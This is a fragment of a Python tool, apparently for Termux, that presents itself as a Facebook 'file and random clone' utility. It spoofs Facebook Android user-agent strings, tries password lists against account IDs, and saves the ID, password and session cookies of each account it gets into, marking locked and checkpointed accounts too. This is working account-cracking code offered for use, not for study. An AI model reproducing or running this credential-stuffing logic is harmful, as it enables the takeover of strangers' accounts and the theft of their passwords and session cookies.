...
def sex():
    ...
    fbby = str(random.randint(10000000,66666666))
    fbrv = str(random.randint(0000000000,99999999))
    density = random.choice(['2.0'])
    width = random.choice(['1080'])
    height = random.choice(['2340'])
    ua = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/9.0{str(fbby)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbby)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/Teletalk;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8;FBSV/;FBOP/1;FBCA/arm64-v8a:]"
    return ua
#__________________LOGO____________#
logo=(f"""       
'\x1b[38;5;46m'   888      .d88888b.  888     888 8888888888 
'\x1b[38;5;47m'   888     d88P" "Y88b 888     888 888        
'\x1b[38;5;48m'   888     888     888 888     888 888        
'\x1b[38;5;49m'   888     888     888 Y88b   d88P 8888888    
'\x1b[38;5;50m'   888     888     888  Y88b d88P  888        
'\x1b[38;5;14m'   888     888     888   Y88o88P   888        
'\x1b[38;5;14m'   888     Y88b. .d88P    Y888P    888        
'\x1b[1;96m'   88888888 "Y88888P"      Y8P     8888888888                                                                                                                          
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G1}[{A}≈{G1}]{G1} DEVELOPER {A}➢{G1} MD EBRAHIM MIAH
{G1}[{A}≈{G1}]{G1} TOOLTYPE  {A}➢{G1} FILE {A}&{G1} RANDOM CLONE
{G1}[{A}≈{G1}]{G1} VERSION   {A}➢{A} V{G1}/{A}1.2
{G1}[{A}≈{G1}]{G1} STATUS    {A}➢{A} PARSONAL 
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
...
def file():
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} /{A}sdcard{G1}/{A}LOVE.txt');linex()
    ...
    try:
        for pas in psd:
            ...
            if 'access_token' in q:
                ...
                if res == 'LIVE':
                	print(f'\r\r{A}[{G1} LOVE-OK{A}]{G1} {uid} {A}|{G1} {pas}');open('/sdcard/LOVE-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');ok.append(uid);break
                if res == 'LOCK':
                	print(f'\r\r{A}[{S}LOVE-LK{A}]{S} {uid} {A}|{S} {pas}');break
            else:continue
        loop+=1
    except Exception as e:
        pass
    ...
    try:
        ...
        for pw in psd:
            ...
            if 'access_token' in po:
                print(f'\r\r{A}[{G1}LOVE-OK{A}]{G1} {ids} {A}|{G1} {pas}')
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                open('/sdcard/LOVE-FILE-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                #print(f'\r\r{A}[{M}LOVE-CP{A}]{M} {ids} {A}|{M} {pas}')
